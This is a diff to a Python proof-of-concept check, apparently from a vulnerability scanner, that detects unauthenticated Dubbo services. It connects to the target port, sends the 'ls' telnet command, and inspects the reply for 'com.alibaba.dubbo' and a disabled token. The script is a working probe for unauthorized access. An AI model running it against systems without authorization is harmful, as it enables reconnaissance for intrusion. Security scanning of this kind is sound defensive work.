@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 # @author: 'orleven'
 
-import socket
+from lib.utils.connect import open_connection
 from script import Script, SERVICE_PORT_MAP
 
 class POC(Script):
@@ -15,18 +15,13 @@ class POC(Script):
         self.level = 'high'
         Script.__init__(self, target=target, service_type=self.service_type)
 
-    def prove(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        try:
-            s.connect((self.target_host, self.target_port))
-            s.sendall(bytes('ls\r\n\r\n','utf-8'))
-            message = str(s.recv(1024))
-            s.close()
-            if 'com.alibaba.dubbo' in message:
-                self.flag = 1
-                self.req.append({"info": "ls"})
-                self.res.append({"info": "dubbo unauth", "key":"ls","dubbo_ls": message})
-        except socket.timeout:
-            pass
-        except Exception :
-            pass
+    async def prove(self):
+        reader, writer = await open_connection(self.target_host, self.target_port)
+        message = 'ls\r\n'
+        writer.write(message.encode())
+        data = str(await reader.read(1024))
+        writer.close()
+        if 'com.alibaba.dubbo' in data and ("token=false" in data or "token=true" not in data):
+            self.flag = 1
+            self.req.append({"info": "ls"})
+            self.res.append({"info": "dubbo unauth", "key":"ls","dubbo_ls": data})
